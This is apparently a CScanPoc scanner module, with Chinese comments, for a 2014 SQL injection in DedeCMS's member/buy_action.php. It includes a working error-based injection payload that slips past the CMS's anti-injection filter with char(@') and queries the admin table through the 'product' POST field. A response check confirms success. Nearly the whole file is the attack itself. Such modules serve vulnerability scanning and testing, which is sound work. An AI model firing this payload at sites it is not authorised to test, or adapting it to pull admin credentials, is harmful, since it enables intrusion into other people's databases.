# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'DedeCMS_0035_L'  # 平台漏洞编号，留空
    name = 'DedeCMS buy_action.php sql注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-01-15'  # 漏洞公布时间
    desc = '''
        DedeCMS 在member\buy_action.php中存在注入，原来是80SEC的防注入，直接char(@')就可以过了，导致SQL注入的发生。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/1161/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'DedeCMS(织梦CMS)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '08ba8514-6a56-49f4-8723-b27b6160728f'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # 漏洞需要会员登录
            s = requests.session()
            payload = '/dede/member/buy_action.php'
            data = """product=1141056911' and char(@') and (SELECT 1 FROM (select count(*),concat(floor(rand(0)*2),(substring((Select (concat(0xC3DCC2EB,userid,0x3a,md5(c))) from #@__admin limit 0,1),1,62)))a from information_schema.tables group by a)b))#"""
            url = self.target + payload
            s.get(url)
            r = s.post(url, data=data)

            if r.status_code == 200 and '4a8a08f09d37b73795649038408b5f33' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
